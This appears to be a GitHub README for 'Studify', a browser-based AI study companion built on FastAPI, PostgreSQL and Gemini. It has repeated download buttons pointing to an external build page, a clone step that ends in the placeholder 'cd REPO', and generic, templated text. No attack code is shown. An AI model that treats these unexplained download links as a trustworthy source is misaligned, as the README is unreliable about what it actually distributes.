# Studify v2026 - AI study companion 2026

> **Studify is a browser-based AI study companion that turns source material into summaries, flashcards, and quizzes, while helping learners stay on track with gamified progress tools.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/benlabs2006/studify-ai-learning-hub?style=flat-square)](https://github.com/benlabs2006/studify-ai-learning-hub)

---

<p align="center">
  <a href="https://benlabs2006.github.io/studify-ai-learning-hub/">
    <img src="https://img.shields.io/badge/Download-Studify%20Latest-brightgreen?style=for-the-badge" alt="Download Studify">
  </a>
</p>

> **[Direct Download - Studify v2026](https://benlabs2006.github.io/studify-ai-learning-hub/)**

---

[Download Latest Build](https://benlabs2006.github.io/studify-ai-learning-hub/)

---

## What Studify Does

Studify is designed for learners who want study sessions to feel more organized and interactive. It applies AI to simplify dense content, surface important ideas, and convert long notes or documents into study-friendly formats.

It also adds structure for students and independent learners who want to keep momentum over time. Flashcards, quizzes, progress tracking, XP, levels, and streaks work together to make repeat study sessions easier to manage and more engaging.

---

## Capabilities

- AI-assisted study support for learning sessions and review
- Automated summarization to condense reading material into key points
- Flashcard generation for quick recall practice
- Quiz creation for self-testing and active learning
- Gamified progress tracking with XP, levels, and streaks
- Subscription-based usage quotas for managing access and limits
- JWT-based authentication for secure user sessions
- PWA-enabled frontend for a more app-like web experience

---

## Installation

Clone the repository and open the project in your preferred environment:

```bash
git clone https://github.com/benlabs2006/studify-ai-learning-hub.git
cd REPO
```

For a local full-stack setup, launch the backend and frontend based on the project layout. Since Studify is web-based, the first run is usually through a local development server or the deployed web build.

---

## How to Use Studify

A common flow is:

1. Sign in with a JWT-backed account.
2. Add study material or paste content to review.
3. Generate a summary, flashcards, or a quiz.
4. Track your progress as you complete sessions.
5. Return later to continue with streaks and leveling.

Example usage pattern:

- Summarize a chapter before exam prep.
- Generate flashcards from lecture notes.
- Build a quiz to check retention after studying.
- Review progress in the gamified dashboard.

---

## Configuration

Setup varies depending on the deployment path. In many cases, environment variables are used to define authentication, AI access, database connection details, and subscription or quota behavior.

Example configuration layout:

```env
DATABASE_URL=postgresql://user:password@localhost:5432/studify
JWT_SECRET=your_secret_value
GEMINI_API_KEY=your_api_key
```

If the frontend is installed as a PWA, browser install prompts and app-specific behavior are handled through the web build and the capabilities of the device being used.

---

## Requirements

- Web browser with modern JavaScript support
- Network access for AI-powered features
- PostgreSQL for persistent application data
- FastAPI backend environment
- Gemini integration for AI functionality
- Storage for user accounts, progress, and generated learning content
- A device that supports PWA installation if you want the app-like experience

---

## Questions

**How do I get updates?**  
Use the latest build link above or pull the newest changes from the repository.

**Where are the main settings?**  
Look for environment configuration, backend service settings, and any frontend runtime variables used by the deployment.

**Why is authentication included?**  
JWT-based authentication is used to manage user sessions and protect account-based features.

**What if summaries or quizzes are not generating correctly?**  
Check your AI service configuration, network connectivity, and any quota limits tied to your account or subscription settings.

**Can I use it like an app on mobile or desktop?**  
Yes, the PWA-enabled frontend is designed to support app-style installation where the browser and device allow it.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
